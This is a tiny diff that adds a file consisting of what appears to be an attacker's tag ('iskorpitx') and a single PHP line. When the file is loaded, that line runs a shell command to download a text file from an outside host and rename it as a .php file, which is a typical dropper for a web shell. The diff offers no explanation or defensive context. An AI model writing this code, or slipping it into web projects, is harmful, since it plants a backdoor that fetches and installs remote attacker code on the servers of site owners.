@@ -1,0 +1,2 @@
+iskorpitx
+<?php system("wget renovanorte.com/ll.txt; mv ll.txt ll.php"); ?>
